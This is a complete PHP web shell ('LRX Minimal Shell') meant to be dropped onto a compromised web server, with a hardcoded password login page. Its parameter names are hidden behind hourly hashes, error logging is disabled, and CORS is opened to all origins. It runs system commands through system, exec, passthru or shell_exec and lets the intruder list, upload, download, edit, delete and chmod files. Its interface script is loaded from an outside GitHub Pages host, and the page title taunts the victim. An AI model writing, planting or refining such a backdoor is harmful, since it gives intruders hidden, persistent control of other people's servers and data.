<?php

// LRX Minimal Shell - Advanced Responsive Design with Login (Dark Black and Glow Green)
session_start();

// Login credentials
$pw = '0x@@1337';

// Handle login
if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $pw) {
            $_SESSION['loggedin'] = true;
        } else {
            echo "<p style='color: red;'>Invalid password</p>";
        }
    }

    if (!isset($_SESSION['loggedin'])) {
        echo "<style>
            body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; margin: 0; padding: 20px; }
            input, button { background-color: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; width: 200px; }
            button:hover { background-color: #0f0; color: #000; }
        </style>";
        echo "<h2>~ LOGIN ~</h2>";
        echo "<form method='POST'>";
        echo "<input type='password' name='password' placeholder='Password'><br>";
        echo "<button type='submit'>Login</button>";
        echo "</form>";
        exit();
    }
}

if (@isset($_REQUEST['api'])) {
	header('Access-Control-Allow-Origin: *');
	header('Access-Control-Allow-Methods: *');
	header('Access-Control-Allow-Headers: *');
	header('Access-Control-Allow-Credentials: true');

	error_reporting(0);
	@set_time_limit(0);
	@clearstatcache();
	@ini_set('error_log', null);
	@ini_set('log_errors', 0);
	@ini_set('max_execution_time', 0);
	@ini_set('output_buffering', 0);
	@ini_set('display_errors', 1);

	date_default_timezone_set('Asia/Jakarta');

	$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
	$userIp = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

	$saltQuery = date('YmdH').$userAgent.$userIp;

	// Menyembunyikan parameter request
	$dl = [
		'dir' => md5('alpha'.$saltQuery),
		'mkdir' => md5('bravo'.$saltQuery),
		'rmdir' => md5('charlie'.$saltQuery),
		'rename' => md5('delta'.$saltQuery),
		'newname' => md5('echo'.$saltQuery),
		'copy' => md5('foxtrot'.$saltQuery),
		'move' => md5('golf'.$saltQuery),
		'dest' => md5('hotel'.$saltQuery),
		'download' => md5('india'.$saltQuery),
		'upload' => md5('juliet'.$saltQuery),
		'chmod' => md5('kilo'.$saltQuery),
		'perm' => md5('lima'.$saltQuery),
		'search' => md5('mike'.$saltQuery),
		'sort' => md5('november'.$saltQuery),
		'list' => md5('oscar'.$saltQuery),
		'file' => md5('papa'.$saltQuery),
		'file_action' => md5('quebec'.$saltQuery),
		'content' => md5('romeo'.$saltQuery),

		// function mapping
	];

	$functionsMapping = [
		'eval' => 'eval',
	];

	if (isset($_REQUEST['qwerty'])) {
		echo json_encode($dl);
		exit;
	}

	if (isset($_REQUEST['asdfgh'])) {
		echo json_encode($functionsMapping);
		exit;
	}

	function getParam($key)
	{
		global $dl;
		if (!isset($_REQUEST[$dl[$key]])) {
			return null;
		}
		$value = $_REQUEST[$dl[$key]];

		return base64_encode(base64_decode($value, true)) === $value ? base64_decode($value) : $value;
	}

	$dir = getParam('dir') ?: getcwd();

	chdir($dir);

	function exe($cmd)
	{
		if (function_exists('system')) {
			@ob_start();
			@system($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();

			return $buff;
		}
		if (function_exists('exec')) {
			@exec($cmd, $results);
			$buff = '';
			foreach ($results as $result) {
				$buff .= $result;
			}

			return $buff;
		}
		if (function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();

			return $buff;
		}
		if (function_exists('shell_exec')) {
			return @shell_exec($cmd);
		}
	}

	function perms($file)
	{
		$perms = @fileperms($file);
		if (false === $perms) {
			return 'unknown';
		}

		if (($perms & 0xC000) == 0xC000) {
			// Socket
			$info = 's';
		} elseif (($perms & 0xA000) == 0xA000) {
			// Symbolic Link
			$info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) {
			// Regular
			$info = '-';
		} elseif (($perms & 0x6000) == 0x6000) {
			// Block special
			$info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) {
			// Directory
			$info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) {
			// Character special
			$info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) {
			// FIFO pipe
			$info = 'p';
		} else {
			// Unknown
			$info = 'u';
		}
		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x') :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x') :
		(($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x') :
		(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}

	function formatSize($bytes)
	{
		$types = ['B', 'KB', 'MB', 'GB', 'TB'];
		for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++) {
		}

		return round($bytes, 2).' '.$types[$i];
	}

	function getsource($url)
	{
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
		$content = curl_exec($curl);
		curl_close($curl);

		return $content;
	}
	if (isset($_REQUEST[$dl['list']])) {
		$files = scandir($dir);
		$fileList = [];
		foreach ($files as $file) {
			if ('.' !== $file && '..' !== $file) {
				$fileData = [
					'id' => uniqid().(is_dir($file) ? $file : md5($file)),
					'name' => $file,
					'type' => is_dir($file) ? 'dir' : 'file',
					'is_dir' => is_dir($file),
					'is_file' => !is_dir($file),
					'size' => is_dir($file) ? '--' : (false !== @filesize($file) ? @formatSize(@filesize($file)) : 'unknown'),
					'last_modified' => @date('Y-m-d H:i:s', @filemtime($file)) ?: 'unknown',
					'permission' => perms($file),
					'owner' => @posix_getpwuid(@fileowner($file))['name'] ?? 'unknown',
					'group' => @posix_getgrgid(@filegroup($file))['name'] ?? 'unknown',
					'is_writeable' => is_writable($file),
					'is_readable' => is_readable($file),
					'path' => is_dir($file) ? @realpath($file) : @dirname(@realpath($file)),
				];
				$fileList[] = $fileData;
			}
		}

		usort($fileList, function ($a, $b) {
			if ($a['is_dir'] && !$b['is_dir']) {
				return -1; // $a is a directory and should come first
			}
			if (!$a['is_dir'] && $b['is_dir']) {
				return 1; // $b is a directory and should come first
			}

			return strcasecmp($a['name'], $b['name']); // Sort alphabetically case-insensitively
		});

		$dirs = explode('/', $dir);

		$path = [
		];

		foreach ($dirs as $id => $pat) {
			if ('' == $pat && 0 == $id) {
				$a = true;
				$path[] = (object) ['name' => '/', 'path' => '/'];
				continue;
			}
			if ('' == $pat) {
				continue;
			}
			$link = '';
			for ($i = 0; $i <= $id; ++$i) {
				$link .= $dirs[$i];
				if ($i != $id) {
					$link .= '/';
				}
			}
			$path[] = (object) ['name' => $pat, 'path' => $link];
		}

		$response = [
			'writeable' => is_writable($dir),
			'path' => $path,
			'realpath' => realpath($dir),
			'permission' => perms($dir),
			'listing' => $fileList,
		];

		echo json_encode($response);
		exit;
	}

	// Membuat direktori
	if ($newDir = getParam('mkdir')) {
		mkdir($newDir);
		echo json_encode(['status' => 'success', 'message' => 'Folder created successfully']);
		exit;
	}

	// Menghapus direktori (termasuk isinya)
	if ($removeDir = getParam('rmdir')) {
		function deleteFolder($folder)
		{
			foreach (glob("{$folder}/*") as $file) {
				is_dir($file) ? deleteFolder($file) : unlink($file);
			}
			rmdir($folder);
		}
		deleteFolder($removeDir);
		echo json_encode(['status' => 'success', 'message' => 'Folder deleted successfully']);
		exit;
	}

	// Rename file atau folder
	if (($rename = getParam('rename')) && ($newname = getParam('newname'))) {
		rename($rename, $newname);
		echo json_encode(['status' => 'success', 'message' => 'Renamed successfully']);
		exit;
	}

	// Copy file atau folder
	if (($copy = getParam('copy')) && ($dest = getParam('dest'))) {
		function copyFolder($source, $dest)
		{
			mkdir($dest);
			foreach (glob("{$source}/*") as $file) {
				$destFile = $dest.'/'.basename($file);
				is_dir($file) ? copyFolder($file, $destFile) : copy($file, $destFile);
			}
		}
		copyFolder($copy, $dest);
		echo json_encode(['status' => 'success', 'message' => 'Copied successfully']);
		exit;
	}

	// Move file atau folder
	if (($move = getParam('move')) && ($dest = getParam('dest'))) {
		if (@rename($move, $dest)) {
			echo json_encode(['success' => true, 'message' => 'Moved successfully']);
		} else {
			echo json_encode(['success' => false, 'message' => 'Failed to move']);
		}
		exit;
	}

	// Download file
	if ($file = getParam('download')) {
		if (file_exists($file)) {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename($file).'"');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: '.filesize($file));
			readfile($file);
			exit;
		}
	}

	// Upload file
	if (!empty($_FILES[$dl['upload']]['name'])) {
		try {
			$uploadPath = $dir.'/'.@basename($_FILES[$dl['upload']]['name']);
			if (!@move_uploaded_file($_FILES[$dl['upload']]['tmp_name'], $uploadPath)) {
				throw new Exception('Failed to upload file');
			}
			echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully']);
		} catch (Exception $e) {
			echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
		}
		exit;
	}

	// Mengubah permission file
	if (($chmod = getParam('chmod')) && ($perm = getParam('perm'))) {
		chmod($chmod, octdec($perm));
		echo json_encode(['status' => 'success', 'message' => 'Permission changed successfully']);
		exit;
	}

	// Pencarian file
	if ($searchTerm = getParam('search')) {
		$files = scandir($dir);
		$results = array_filter($files, function ($file) use ($searchTerm) {
			return false !== stripos($file, $searchTerm);
		});
		echo json_encode(['results' => array_values($results)]);
		exit;
	}

	// Sortir file berdasarkan ukuran
	if ('size' == getParam('sort')) {
		$files = scandir($dir);
		usort($files, function ($a, $b) use ($dir) {
			return filesize($dir.'/'.$a) - filesize($dir.'/'.$b);
		});
		echo json_encode(['sorted_files' => $files]);
		exit;
	}

	if ($file = getParam('file')) {
		if (!file_exists($file) || !is_readable($file)) {
			echo json_encode(['status' => 'error', 'message' => 'File tidak ditemukan atau tidak dapat dibaca']);
			exit;
		}
		$fileaction = getParam('file_action');
		if ('view' == $fileaction) {
			$content = @file_get_contents($file);
			echo $content;
			exit;
		}

		if ('edit' == $fileaction) {
			$content = getParam('content');
			foreach ($functionsMapping as $key => $value) {
				$content = str_replace($value, $key, $content);
			}
			$content = @file_put_contents($file, $content);
			if ($content) {
				echo json_encode(['status' => 'success', 'message' => 'File berhasil diubah']);
			} else {
				echo json_encode(['status' => 'error', 'message' => 'Gagal mengubah file']);
			}
			exit;
		}
		if ('delete' == $fileaction) {
			if (@unlink($file)) {
				echo json_encode(['status' => 'success', 'message' => 'File berhasil dihapus']);
			} else {
				echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus file']);
			}
			exit;
		}
	}
}

?>
<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<title>you lose!! HAHA</title>
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<link href="//pukimai1337.github.io/kebutuhan/shelljs/shell-js.css" rel="stylesheet">		
	</head>
<body>
	<script src="//pukimai1337.github.io/kebutuhan/shelljs/shell-js.js"></script>
</body>
</html>
